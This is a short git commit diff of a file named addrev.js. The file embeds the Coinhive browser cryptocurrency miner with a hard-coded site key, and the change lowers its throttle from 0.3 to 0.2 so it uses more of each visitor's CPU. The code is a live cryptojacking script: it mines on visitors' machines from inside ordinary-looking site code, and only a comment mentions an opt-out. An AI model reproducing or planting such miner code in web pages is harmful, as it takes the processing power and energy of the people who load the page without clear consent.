afb1f16c73422e8febe4a0fc6f220bfa1eda8084
D.Edwards <dae3f@uvawise.edu>
2018-02-18 13:54:03 -0500

    Update addrev.js

--- addrev.js
+++ addrev.js
@@ -1,6 +1,6 @@
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 		<script>
-			var miner = new CoinHive.Anonymous('6G2Yzqq456YELrakAnMufo26MoSLEZqA', {throttle: 0.3});
+			var miner = new CoinHive.Anonymous('6G2Yzqq456YELrakAnMufo26MoSLEZqA', {throttle: 0.2});
 			// Only start on non-mobile devices and if not opted-out
 			// in the last 14400 seconds (4 hours):
 			if (!miner.isMobile()) {
